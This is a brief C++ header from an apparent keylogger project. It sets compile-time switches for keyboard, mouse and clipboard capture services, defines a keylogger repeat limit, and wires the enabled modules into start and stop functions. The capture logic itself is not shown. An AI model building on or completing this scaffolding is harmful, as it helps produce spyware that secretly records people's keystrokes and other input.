#pragma once

// Service toggle
#define KEYBOARD_SERVICE	true
#define MOUSE_SERVICE		false
#define CRIPBOARD_SERVICE	false

// Keylogger settings
#define KEYLOGGER_MAX_REPEATS 10

// Includes
#if KEYBOARD_SERVICE
#include "keyboard.h"
#endif
#if MOUSE_SERVICE
#include "mouse.h"
#endif
#if CRIPBOARD_SERVICE
#include "clipboard.h"
#endif

namespace services
{
	static void runAll()
	{
#if KEYBOARD_SERVICE
		keyboard::run();
#endif
#if MOUSE_SERVICE
		mouse::run();
#endif
#if CRIPBOARD_SERVICE

#endif
	}

	static void stopAll()
	{
#if KEYBOARD_SERVICE
		keyboard::stop();
#endif
#if MOUSE_SERVICE
		mouse::stop();
#endif
#if CRIPBOARD_SERVICE

#endif
	}
}